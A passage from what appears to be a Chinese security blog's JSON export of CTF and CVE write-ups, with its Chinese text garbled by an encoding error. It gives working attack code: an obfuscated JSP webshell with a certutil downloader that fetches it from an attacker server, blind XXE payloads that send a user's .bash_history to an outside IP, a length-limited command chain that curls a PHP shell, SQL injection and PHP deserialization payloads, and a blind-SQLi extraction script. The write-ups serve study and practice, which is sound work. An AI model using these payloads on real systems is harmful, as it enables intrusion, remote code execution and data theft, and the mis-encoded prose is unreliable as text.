å¯ä»¥å¼¹ä¸€ä¸‡ä¸ªè®¡ç®—å™¨æ‰§è¡Œå…¶ä»–å‘½ä»¤æ¥å¯¹é¶æœºè¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚ä¸‹è½½ä¸€ä¸ªwebshell\nå‡ºç½‘ä¸‹è½½webshell è¿™ä¸ªå¾—å…æ€JSPshellï¼Œåˆ«é—®ï¼Œé—®å°±æ˜¯ç›´æ¥ç»™ä½ banäº†ï¼Œä¹‹å‰ç”¨ä¸€ä¸ªä¸€å¥è¯ï¼Œé™¤äº†whoamiéƒ½ä¸èƒ½æ¥äº‹å„¿ã€‚\nå…æ€jspshellåœ°å€ï¼šhttps://www.jianshu.com/p/12dce12b2036\nVPSä¸Šé¢æ„é€ ä¸€ä¸ªtxtï¼š\n\u0026lt;%@ page contentType=\u0026quot;text/html;charset=UTF-8\u0026quot; language=\u0026quot;java\u0026quot; %\u0026gt;\r\u0026lt;%@ page import=\u0026quot;sun.misc.BASE64Decoder\u0026quot; %\u0026gt;\r\u0026lt;%\rif(request.getParameter(\u0026quot;cmd\u0026quot;)!=null){\rBASE64Decoder decoder = new BASE64Decoder();\rClass rt = Class.forName(new String(decoder.decodeBuffer(\u0026quot;amF2YS5sYW5nLlJ1bnRpbWU=\u0026quot;)));\rProcess e = (Process)\rrt.getMethod(new String(decoder.decodeBuffer(\u0026quot;ZXhlYw==\u0026quot;)), String.class).invoke(rt.getMethod(new\rString(decoder.decodeBuffer(\u0026quot;Z2V0UnVudGltZQ==\u0026quot;))).invoke(null, new\rObject[]{}), request.getParameter(\u0026quot;cmd\u0026quot;) );\rjava.io.InputStream in = e.getInputStream();\rint a = -1;\rbyte[] b = new byte[2048];\rout.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;);\rwhile((a=in.read(b))!=-1){\rout.println(new String(b));\r}\rout.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;);\r}\r%\u0026gt;\ræ›¿æ¢ç¼–è¯‘ä¸‹é¢çš„javaï¼š\npublic class LifExp { static { try { String[] cmd = {\u0026quot;cmd.exe\u0026quot;, \u0026quot;/c\u0026quot;, \u0026quot;certutil.exe -urlcache -split -f\u0026quot;, \u0026quot;http://IP:ç«¯å£/jspshell.txt\u0026quot;, \u0026quot;..\\\\webapps\\\\ROOT\\\\jspshell.jsp\u0026quot;};\rjava.lang.Runtime.getRuntime().\rexec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }\rç¬¬å››è¡Œï¼ŒWindowsä¸‹ä½¿ç”¨certutil.exeå¯ä»¥å®ç°æ–‡ä»¶ä¸‹è½½ï¼ŒcurlåŠŸèƒ½ã€‚\nå› ä¸ºå½“å‰é¶æœºæ‰§è¡Œå‘½ä»¤çš„è·¯å¾„æ˜¯ tomcat\\bin  æ‰€ä»¥æˆ‘ä»¬ä¸‹è½½webshellçš„æ—¶å€™ï¼Œä¸€å®šè¦ä¸‹è½½åˆ°index.jspç›¸åŒè·¯å¾„ä¾¿äºæˆ‘ä»¬è®¿é—®ï¼Œä¹Ÿå°±æ˜¯ tomcat-9.0.17\\webapps\\ROOT ã€‚\næ‰§è¡Œäº†å‘½ä»¤ä¹‹åï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢å·²ç»å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„shelläº†ï¼š\nè€Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»å¯ä»¥æ­£å¸¸è®¿é—®shelläº†ï¼š\n?cmd=cmd /c å‘½ä»¤ è®°å¾—urlç¼–ç ï¼›\nå¦‚æœæˆ‘ä»¬è¦æŸ¥çœ‹æ¡Œé¢çš„æŸä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€ä¸ªå«åšflag.txtçš„æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œ type %userprofile%\\desktop\\flag*\nåŸç†å‰–æ å¤ªèœäº†ï¼Œä¸ä¼šã€‚\nhttps://www.freebuf.com/column/236744.html\nhttps://www.anquanke.com/post/id/203870\n","date":"2020-06-15T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170944.png","permalink":"https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/","title":"CVE-2020-7961 Liferay Portal ååºåˆ—åŒ–-å¤ç°"},{"content":"åˆæ˜¯ä¸€åœºæŠŠèŒæ–°éª—è¿‡å»æ€çš„æ¯”èµ›ï¼Œå¼¹è®¡ç®—å™¨å¥½ç©ï¼ŒåŸŸæ¸—é€ä¸ä¼šï¼Œxxeç›²æ‰“ssrfå­¦åˆ°äº†\n sqli-labs 0 è€ƒç‚¹ï¼šURLäºŒæ¬¡ç¼–ç ï¼Œå †å æ³¨å…¥\nå †å å…¶å®å¾ˆç®€å•ï¼Œä¹Ÿå‘ç°ä»€ä¹ˆè¿‡æ»¤ï¼Œä¸»è¦æ˜¯äºŒæ¬¡ç¼–ç æœ‰ç‚¹å‘ã€‚ã€‚ã€‚\næŸ¥çœ‹åº“åï¼š\n?id=1%2527;show%20databases;%23 æŸ¥çœ‹è¡¨åï¼š\n?id=1%2527;show%20tables;%23\ræŸ¥çœ‹è¡¨çš„ç¬¬ä¸€æ¡æ•°æ®ï¼š\n?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}\nç™½ç»™çš„ååºåˆ—åŒ– è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–\nå¼€é¢˜é€ç ï¼š\n\u0026lt;?php\rclass home\r{\rprivate $method;\rprivate $args;\rfunction __construct($method, $args)\r{\r$this-\u0026gt;method = $method;\r$this-\u0026gt;args = $args;\r}\rfunction __destruct()\r{\rif (in_array($this-\u0026gt;method, array(\u0026quot;mysys\u0026quot;))) {\rcall_user_func_array(array($this, $this-\u0026gt;method), $this-\u0026gt;args);\r}\r}\rfunction mysys($path)\r{\rprint_r(base64_encode(exec(\u0026quot;cat $path\u0026quot;)));\r}\rfunction waf($str)\r{\rif (strlen($str) \u0026gt; 8) {\rdie(\u0026quot;No\u0026quot;);\r}\rreturn $str;\r}\rfunction __wakeup()\r{\r$num = 0;\rforeach ($this-\u0026gt;args as $k =\u0026gt; $v) {\r$this-\u0026gt;args[$k] = $this-\u0026gt;waf(trim($v));\r$num += 1;\rif ($num \u0026gt; 2) {\rdie(\u0026quot;No\u0026quot;);\r}\r}\r}\r}\rif ($_GET['path']) {\r$path = @$_GET['path'];\runserialize($path);\r} else {\rhighlight_file(__FILE__);\r}\r?\u0026gt;\ræ ¸å¿ƒæ˜¯åœ¨ mysys å‡½æ•°ï¼Œå¯ä»¥è¿”å›base64ç¼–ç ä¹‹åçš„execå†…å®¹ï¼›\nè€Œ __destruct é‡Œé¢é¦–å…ˆæ˜¯ä¸€ä¸ª in_array çš„åˆ¤æ–­ï¼Œå¦‚æœ $this-\u0026gt;method çš„å€¼æ˜¯åœ¨ä¸€ä¸ªæ•°ç»„é‡Œé¢çš„è¯ï¼Œå°±æ‰§è¡Œ call_user_func_array ï¼Œè€Œè¿™ä¸ªæ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´ é‚£å°±æ˜¯ mysys ï¼Œæ‰€ä»¥æˆ‘ä»¬methodå°±ä¼ å…¥mysyså­—ç¬¦ä¸²å°±è¡Œã€‚\nè‡³äºcall_user_func_arrayï¼ŒPHPæ‰‹å†Œæ˜¯è¿™æ ·å†™çš„ï¼š\nmixed call_user_func_array ( callable $callback , array $param_arr )\ræŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥ã€‚\rcallback\rè¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ã€‚\rparam_arr\rè¦è¢«ä¼ å…¥å›è°ƒå‡½æ•°çš„æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å¾—æ˜¯ç´¢å¼•æ•°ç»„ã€‚\ré‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç»™ $args èµ‹ä¸€ä¸ªæ•°ç»„å°±è¡Œäº†ï¼›\n'''\ré¢˜ç›®æºç \r'''\r$pop = new home('mysys',array('flag.php'));\recho serialize($pop);\rå¾—åˆ° O:4:\u0026quot;home\u0026quot;:2:{s:12:\u0026quot; home method\u0026quot;;s:5:\u0026quot;mysys\u0026quot;;s:10:\u0026quot; home args\u0026quot;;a:1:{i:0;s:8:\u0026quot;flag.php\u0026quot;;}} æ³¨å…¥privateå¯¹è±¡åŠ ä¸ª%00å°±è¡Œã€‚\npayload:\n?path=O:4:\u0026quot;home\u0026quot;:2:{s:12:\u0026quot;%00home%00method\u0026quot;;s:5:\u0026quot;mysys\u0026quot;;s:10:\u0026quot;%00home%00args\u0026quot;;a:1:{i:0;s:8:\u0026quot;flag.php\u0026quot;;}}\rflag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}\nç®€å•åŸŸæ¸—é€-flag1 è€ƒç‚¹ï¼šCVE-2020-7961 Liferay Portal ååºåˆ—åŒ–\nè¯·ç§»æ­¥æœ¬ç«™ï¼šCVE-2020-7961 Liferay Portal ååºåˆ—åŒ–-å¤ç°\nsvgggggg! è€ƒç‚¹ï¼šXXEç›²æ‰“ï¼ŒSSRFï¼Œsqliå†™shell\næ‰“å¼€é¢˜ç›®ï¼Œå«æˆ‘ä»¬ç»™ä¸€ä¸ªURLï¼Œç„¶åcheckè¿™ä¸ªURLæŒ‡å‘çš„fileæ˜¯ä¸æ˜¯svgå›¾ç‰‡\nä»€ä¹ˆæ˜¯SVGï¼Ÿ  SVG æŒ‡å¯ä¼¸ç¼©çŸ¢é‡å›¾å½¢ (Scalable Vector Graphics) SVG ç”¨æ¥å®šä¹‰ç”¨äºç½‘ç»œçš„åŸºäºçŸ¢é‡çš„å›¾å½¢ SVG ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾å½¢ SVG å›¾åƒåœ¨æ”¾å¤§æˆ–æ”¹å˜å°ºå¯¸çš„æƒ…å†µä¸‹å…¶å›¾å½¢è´¨é‡ä¸ä¼šæœ‰æ‰€æŸå¤± SVG æ˜¯ä¸‡ç»´ç½‘è”ç›Ÿçš„æ ‡å‡† SVG ä¸è¯¸å¦‚ DOM å’Œ XSL ä¹‹ç±»çš„ W3C æ ‡å‡†æ˜¯ä¸€ä¸ªæ•´ä½“  ç”±äºSVGæ˜¯åŸºäºXMLçš„çŸ¢é‡å›¾ï¼Œå› æ­¤å¯ä»¥æ”¯æŒEntityï¼ˆå®ä½“ï¼‰åŠŸèƒ½ã€‚\næˆ‘ä»¬è‡ªç„¶è€Œç„¶åœ°æƒ³åˆ°äº†XXEã€‚\nåˆ©ç”¨SVGè¿›è¡ŒXXEæ”»å‡» æˆ‘ä»ç½‘ä¸Šæœç´¢äº†ä¸€ä¸ªSVGå›¾ç‰‡çš„æºç ï¼Œæ”¹è£…äº†ä¸€ä¸‹ï¼Œåœ¨VPSä¸Šé¢å‘½åä¸º 1.svg ï¼š\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE fortiguard [ \u0026lt;!ENTITY lab \u0026quot;HELLO\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;svg xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; height=\u0026quot;200\u0026quot; width=\u0026quot;200\u0026quot;\u0026gt;\r\u0026lt;text y=\u0026quot;20\u0026quot; font-size=\u0026quot;20\u0026quot;\u0026gt;\u0026amp;lab;\u0026lt;/text\u0026gt;\t\u0026lt;/svg\u0026gt;\ræäº¤åœ°å€ï¼Œæˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„å®ä½“å·²ç»èµ·ä½œç”¨äº†ï¼ˆè¿™é‡Œåªæ˜¯å› ä¸ºæŒ¡ä½äº†ï¼Œä½†æ˜¯F12å¯ä»¥çœ‹åˆ°ï¼‰\né‚£ä¹ˆå¤§è‡´å°±èƒ½å®é”¤æ˜¯XXEï¼›\nå°è¯•ç›´æ¥è¯»å–æ–‡ä»¶ï¼š\n1.svg\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE fortiguard [ \u0026lt;!ENTITY lab SYSTEM \u0026quot;file:///home/r1ck/.bash_history\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;svg xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; height=\u0026quot;200\u0026quot; width=\u0026quot;200\u0026quot;\u0026gt;\r\u0026lt;text y=\u0026quot;20\u0026quot; font-size=\u0026quot;20\u0026quot;\u0026gt;\u0026amp;lab;\u0026lt;/text\u0026gt;\r\u0026lt;/svg\u0026gt;\rå½“ç„¶ä¸å¯èƒ½è¿™ä¹ˆç®€å•ï¼Œé¡µé¢è™½ç„¶æ­£å¸¸è¿”å›ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è¯»åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼›\næ— å›æ˜¾ï¼Œä½†æ˜¯åˆæ˜¯XXEï¼Œæˆ‘ä»¬åˆè‡ªç„¶åœ°æƒ³åˆ°äº†XXEç›²æ‰“ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åŠ è½½å¤–éƒ¨ä¸€ä¸ªdtdæ–‡ä»¶ï¼Œç„¶åæŠŠè¯»å–ç»“æœä»¥HTTPè¯·æ±‚çš„æ–¹å¼å‘é€åˆ°è‡ªå·±çš„VPSã€‚\næ„é€  entity.svg :\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE fortiguard [ \u0026lt;!ENTITY lab SYSTEM \u0026quot;file:///home/r1ck/.bash_history\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % file SYSTEM \u0026quot;file:///home/r1ck/.bash_history\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % dtd SYSTEM \u0026quot;http://IP:ç«¯å£/1.dtd\u0026quot;\u0026gt;\r%dtd;\r%send;\r]\u0026gt;\r\u0026lt;svg xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; height=\u0026quot;200\u0026quot; width=\u0026quot;200\u0026quot;\u0026gt;\r\u0026lt;text y=\u0026quot;20\u0026quot; font-size=\u0026quot;20\u0026quot;\u0026gt;\u0026amp;lab;\u0026lt;/text\u0026gt;\r\u0026lt;/svg\u0026gt;\ræ„é€  1.dtd ï¼š\n\u0026lt;!ENTITY % all\r\u0026quot;\u0026lt;!ENTITY \u0026amp;#x25; send SYSTEM 'http://IP:ç«¯å£/?%file;'\u0026gt;\u0026quot;\r\u0026gt;\r%all;\rå‘é€ entity.svg åœ°å€ï¼›\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°dtdæ–‡ä»¶å®é™…ä¸Šå·²ç»è¢«åŠ è½½äº†ï¼Œä½†æ˜¯å´æ²¡æœ‰æ”¶åˆ°è¯»å–æ–‡ä»¶ä¹‹åçš„è¯·æ±‚\nåˆ¤æ–­é—®é¢˜å‡ºåœ¨è¯»æ–‡ä»¶é‚£ä¸€æ­¥ï¼Œä½†æ˜¯å€˜è‹¥æˆ‘ä»¬è¯»å–çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œæ¯”å¦‚file:///xxx/xx.xï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘é€svgæ–‡ä»¶åœ°å€ä¹‹åï¼Œé¡µé¢æ˜¯æ²¡æœ‰å›æ˜¾å†…å®¹çš„ï¼› ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¯»å–çš„æ˜¯ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œé¡µé¢ä¼šæœ‰å›æ˜¾å†…å®¹ã€‚\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼Œè¯»æ–‡ä»¶æ˜¯è¯»åˆ°äº†ï¼Œä½†æ˜¯åœ¨å‘åŒ…çš„æ—¶å€™å‡ºäº†é—®é¢˜ã€‚\né—®é¢˜å°±å‡ºåœ¨æ¢è¡Œå’Œç©ºæ ¼ã€‚\nå› ä¸ºæ˜¯GETè¯·æ±‚å‘é€åˆ°VPSï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æœ‰æ¢è¡Œå’Œç©ºæ ¼ï¼Œä¸ç„¶å°±ä¼š400ã€‚\nè§£å†³æ–¹æ³•å½“ç„¶æ˜¯base64ã€‚xmlè§£æå™¨æ”¯æŒä½¿ç”¨php://filterè¿›è¡Œç¼–ç \nä¿®æ”¹ entity.svg :\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE fortiguard [ \u0026lt;!ENTITY lab SYSTEM \u0026quot;file:///home/r1ck/.bash_history\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % file SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history\u0026quot;\u0026gt;\r\u0026lt;!ENTITY % dtd SYSTEM \u0026quot;http://59.110.157.4:8000/1.dtd\u0026quot;\u0026gt;\r%dtd;\r%send;\r]\u0026gt;\r\u0026lt;svg xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; height=\u0026quot;200\u0026quot; width=\u0026quot;200\u0026quot;\u0026gt;\r\u0026lt;text y=\u0026quot;20\u0026quot; font-size=\u0026quot;20\u0026quot;\u0026gt;\u0026amp;lab;\u0026lt;/text\u0026gt;\r\u0026lt;/svg\u0026gt;\rè¯»åˆ°äº†.bash_historyï¼š\ncd /app\rphp -S 0.0.0.0:8080\ræ˜æ˜¾æ˜¯SSRFæ‰“å†…ç½‘ï¼›\nåˆ©ç”¨XXEæ‰“SSRF ä¿®æ”¹ entity.svg ï¼Œå¾—åˆ° 127.0.0.1:8080 çš„æºç ï¼š\n\u0026lt;!doctype html\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;index\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\rHi!\rYou Find Me .\rFlag is nearby.\r\u0026lt;body\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rArray\r(\r[id] =\u0026gt; 1\r[name] =\u0026gt; test\r)\rå¯ä»¥çœ‹åˆ°æ˜¯ä¸ªsqliï¼›\næ ¹æ®hintï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥getshellï¼Œæµ‹å‡ºæ¥æ²¡æœ‰å †å ï¼Œä½†æ˜¯å¯ä»¥è”åˆæŸ¥è¯¢\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨union selectç›´æ¥å†™ä¸€ä¸ªshellåˆ°/appç›®å½•ï¼›\nä½†æ˜¯åˆ°äº†è¿™é‡Œé‡åˆ°äº†ç„å­¦åŸå› ï¼Œphpä¸€å¥è¯å†™è¿›å»ä¼šè«åå…¶å¦™æ¶ˆå¤±ï¼Œç­‰å¼€æºä¹‹åæœ¬åœ°å¤ç°ï¼›\n","date":"2020-06-15T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/dozerctf2020_web/","title":"DozerCTF2020_web"},{"content":"è¿™ä¸ªä¸œè¥¿èµ·æºäºHITCON CTF 2017çš„ä¸€é“é¢˜ï¼Œé«˜æ ¡æˆ˜ç–«Hack Meä¹Ÿæ›¾ç»å‡ºç°è¿‡ï¼Œæœ€è¿‘çªç„¶åšåˆ°äº†æ¥è¯´ä¸€ä¸‹\nå‚è€ƒï¼šhttps://www.anquanke.com/post/id/87203\n æºç  äº”å­—ç‰ˆæœ¬\n\u0026lt;?php\r$sandbox = '/www/sandbox/' . md5(\u0026quot;orange\u0026quot; . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rif (isset($_GET['cmd']) \u0026amp;\u0026amp; strlen($_GET['cmd']) \u0026lt;= 5) {\r@exec($_GET['cmd']);\r} else if (isset($_GET['reset'])) {\r@exec('/bin/rm -rf ' . $sandbox);\r}\rhighlight_file(__FILE__);\rå››å­—ç‰ˆæœ¬ï¼š\n\u0026lt;?php\r$sandbox = '/www/sandbox/' . md5(\u0026quot;orange\u0026quot; . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\rif (isset($_GET['cmd']) \u0026amp;\u0026amp; strlen($_GET['cmd']) \u0026lt;= 4) {\r@exec($_GET['cmd']);\r} else if (isset($_GET['reset'])) {\r@exec('/bin/rm -rf ' . $sandbox);\r}\rhighlight_file(__FILE__);\ré¢„å¤‡çŸ¥è¯† åœ¨cmdé•¿åº¦å°äº5ï¼ˆ4ï¼‰ä¸ªå­—ç¬¦çš„æ—¶å€™ç”¨ exec å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸è¿‡ exec å‡½æ•°æ˜¯é»˜è®¤æ²¡æœ‰å›æ˜¾çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°±åªèƒ½ç›²æ‰“ã€‚\nLinuxç”¨\\è¿æ¥å¤šè¡Œå‘½ä»¤ Linuxç³»ç»Ÿä¸­æ”¯æŒç”¨ \\ å­—ç¬¦æ¥åˆ†å‰²ä¸€ä¸ªå¤šè¡Œå‘½ä»¤ï¼Œåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å³ä½¿æœ‰æ— æ³•è¯†åˆ«çš„å‘½ä»¤ï¼ŒæŠ¥é”™ï¼Œä¹Ÿä¸ä¼šå½±å“å…¶ä»–æ­£å¸¸å‘½ä»¤æ‰§è¡Œ\nç”¨ä¸¤ä¸ªå­—ç¬¦åœ¨Linuxä¸‹åˆ›å»ºæ–‡ä»¶ lsçš„æ–‡ä»¶æ’åºå’Œls -tçš„æ–‡ä»¶æ’åº ls\nls -t\nå¯ä»¥çœ‹åˆ°ï¼Œ ls æ˜¯æŒ‰ç…§alphabetæ¥æ’åºçš„ï¼Œ ls -t æ˜¯æŒ‰ç…§åˆ›å»ºæ—¶é—´çš„é¡ºåºæ¥æ’åºçš„\nåˆ†æ æˆ‘ä»¬åœ¨åŸæ–‡å¯ä»¥çœ‹åˆ°ï¼Œä½œè€…é€šè¿‡äº†åˆ›å»ºæ–‡ä»¶ï¼Œåˆ©ç”¨æ–‡ä»¶åæ„é€ curlå‘½ä»¤ï¼Œç„¶åç”¨lså‘½ä»¤è¿½åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œå†ç”¨shå‘½ä»¤å»æ‰§è¡Œå®ƒ\næ€è·¯æ˜¾ç„¶æ˜¯éå¸¸çš„çˆ†ç‚¸ï¼Œä½†æ˜¯æˆ‘ç»è¿‡å¤ç°ä¹‹åï¼Œå‘ç°è¿™ç§æ„é€ å¾ˆå›°éš¾ï¼Œä½œè€…åˆ©ç”¨äº†IPçš„16è¿›åˆ¶ã€8è¿›åˆ¶å’Œé•¿æ•´å‹å½¢å¼æ¥æ„é€ æ–‡ä»¶åï¼Œè€Œä¸”åˆ†å‰²ä¹‹åæ°æ°åˆæ˜¯æ»¡è¶³alphabetçš„ï¼Œè€ŒVPSçš„ipæ˜¯å›ºå®šä¸å˜çš„ï¼Œæƒ³è¦æ‰¾ä¸€ä¸ªè¿™æ ·çš„IPéœ€è¦ä¸€å®šçš„å·§åˆã€‚\nå¹¶ä¸”åŸä½œè€…playloadçš„åˆ°æ•°ç¬¬ä¸‰è¡Œï¼š\nåˆ©ç”¨äº†Aæ–‡ä»¶æœ¬èº«å°±åœ¨lså‘½ä»¤å›æ˜¾çš„ç‰¹æ€§ï¼Œæˆ‘æ„é€ åˆ°è¿™é‡Œï¼Œå¾ˆéš¾å—ï¼Œè¿™ä¸ªæŠ€å·§å¤ªé«˜ã€‚\nls -t ã€ rev ã€ * å‘½ä»¤ç»“åˆä½¿ç”¨å›é¿alphabet è€Œåœ¨HITCON2017çš„å››å­—ç‰ˆæœ¬é‡Œé¢ï¼Œæœ‰å¸ˆå‚…åˆ©ç”¨ ls -t å’Œ rev å’Œ * é¿å¼€äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡æ€è·¯ä¹Ÿæ˜¯ç›¸å½“çš„å·§å¦™\nimport requests\rimport time\rhost = '127.0.0.1'\rplayload = [\r# generate \u0026quot;g\u0026gt; ht- sl\u0026quot; to file \u0026quot;v\u0026quot;\r'\u0026gt;dir',\r'\u0026gt;g\\\u0026gt;',\r'\u0026gt;ht-',\r'\u0026gt;sl',\r'*\u0026gt;v',\r# reverse file \u0026quot;v\u0026quot; to file \u0026quot;h\u0026quot;, content \u0026quot;ls -th \u0026gt;g\u0026quot;\r'\u0026gt;rev',\r'*v\u0026gt;h',\r# generate \u0026quot;curl 59.xx0.x5x.4\u0026gt;p.php\u0026quot;\r'\u0026gt;\\;\\\\',\r'\u0026gt;p',\r'\u0026gt;ph\\\\',\r'\u0026gt;p.\\\\',\r'\u0026gt;\\\u0026gt;\\\\',\r'\u0026gt;4\\\\',\r'\u0026gt;5x.\\\\',\r'\u0026gt;0.x\\\\',\r'\u0026gt;xx\\\\',\r'\u0026gt;59.\\\\',\r'\u0026gt;\\ \\\\',\r'\u0026gt;rl\\\\',\r'\u0026gt;cu\\\\',\r'sh h',\r'sh g',\r]\rfor i in playload:\rcmd = i\rr = requests.get(host + '?cmd=' + i)\r#print(r.text)\rtime.sleep(0.2)\rè¿™æ˜¯5å­—ç‰ˆæœ¬çš„expï¼Œ4å­—ç‰ˆæœ¬åªéœ€è¦æ”¹ä¸€ä¸‹è‡ªå·±çš„IPã€‚\nå…¶ä¸­ * è¿™ä¸ªå‘½ä»¤å¾ˆæœ‰æ„æ€\næ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆæ˜æ˜¾æ¯”åŸæ¥çš„åˆ©ç”¨alphabetçš„æ’åºæ¥å†™shellå¥½å¤šäº†\n","date":"2020-06-02T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/","title":"ç»•è¿‡4-5ä¸ªå­—ç¬¦é™åˆ¶getshell"},{"content":"æ­¦æ±‰å¤§å­¦çš„CTFï¼Œéš¾çš„ç®€å•çš„éƒ½æœ‰ï¼Œæœ€è¿‘æ¯”èµ›æ˜¯çœŸæ»´å¤šï¼Œæ‰“å®Œé‡‘ç›†æ´—æ‰‹äº†\n Easy_sqli è€ƒç‚¹ï¼šboolç›²æ³¨ï¼ŒåŒå†™ç»•è¿‡\nç®€å•ï¼Œæ²¡å•¥å¥½è®²çš„\n#wh1sper\rimport requests\rhost = 'http://218.197.154.9:10011/login.php#'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\rbabyselect = '(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)'#\rselect = \u0026quot;1' oorr ascii(substr(\u0026quot;+babyselect+\u0026quot;,{},1))\u0026gt;{} #\u0026quot;.format(j, mid(bot, top))\rdata = {\u0026quot;user\u0026quot;: select, \u0026quot;pass\u0026quot;: \u0026quot;a\u0026quot;}\rr = requests.post(url=host, data=data)\r#print(data)\rif 'Login success!' in r.text: # æˆåŠŸ\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼Œè¯´æ˜nameæ˜¯top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # æˆåŠŸå°±ä¸Šç§»bot\relse: # å¤±è´¥\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼ŒåŠ ä¸Šå¤±è´¥ï¼Œè¯´æ˜nameæ˜¯bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # å¤±è´¥å°±ä¸‹ç§»top\rif __name__ == '__main__':\rsqli()\rWHUCTF{r3lly_re11y_n0t_d1ffIcult_yet??~}\nezphp è€ƒç‚¹ï¼š%0aç»•è¿‡preg_matchã€md5çˆ†ç ´ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸\néƒ½æ˜¯åŸé¢˜ï¼š\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__file__);\r$string_1 = $_GET['str1'];\r$string_2 = $_GET['str2'];\r//1st\rif($_GET['num'] !== '23333' \u0026amp;\u0026amp; preg_match('/^23333$/', $_GET['num'])){\recho '1st ok'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\relse{\rdie('ä¼šä»£ç å®¡è®¡å˜›23333');\r}\r//2nd\rif(is_numeric($string_1)){\r$md5_1 = md5($string_1);\r$md5_2 = md5($string_2);\rif($md5_1 != $md5_2){\r$a = strtr($md5_1, 'pggnb', '12345');\r$b = strtr($md5_2, 'pggnb', '12345');\rif($a == $b){\recho '2nd ok'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\relse{\rdie(\u0026quot;can u give me the right str???\u0026quot;);\r}\r} 